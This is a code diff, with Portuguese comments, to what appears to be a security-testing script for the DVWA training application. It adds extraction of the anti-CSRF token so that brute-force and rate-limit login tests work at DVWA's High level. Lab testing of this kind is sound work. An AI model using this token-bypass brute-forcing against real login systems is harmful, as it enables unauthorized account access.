@@ -60,6 +60,19 @@ def login_dvwa(base_url: str, username: str, password: str):
     return session
 
 
+def _extract_csrf_token(session: requests.Session, url: str) -> str | None:
+    """Extrai o token CSRF (user_token) da página se estiver presente (obrigatório no DVWA High)."""
+    try:
+        resp = session.get(url, timeout=10)
+        soup = BeautifulSoup(resp.text, "html.parser")
+        token_input = soup.find("input", {"name": "user_token"})
+        if token_input:
+            return token_input.get("value")
+    except Exception:
+        pass
+    return None
+
+
 def test_brute_force(
     session,
     brute_force_url: str,
@@ -68,6 +81,7 @@ def test_brute_force(
 ):
     """
     Testa um conjunto controlado de credenciais.
+    Suporta Low, Medium e High (com extração dinâmica de token anti-CSRF).
     """
 
     for password in passwords:
@@ -78,10 +92,15 @@ def test_brute_force(
             "Login": "Login"
         }
 
+        # Extrai o token anti-CSRF caso a aplicação o exija (nível High)
+        token = _extract_csrf_token(session, brute_force_url)
+        if token:
+            params["user_token"] = token
+
         response = session.get(
             brute_force_url,
             params=params,
-            timeout=10
+            timeout=20
         )
 
         print(f"[A07] Testando credencial: '{password}' (Status HTTP: {response.status_code})")
@@ -163,6 +182,10 @@ def test_rate_limiting(
             "password": password,
             "Login": "Login"
         }
+
+        token = _extract_csrf_token(session, brute_force_url)
+        if token:
+            params["user_token"] = token
 
         try:
             response = session.get(
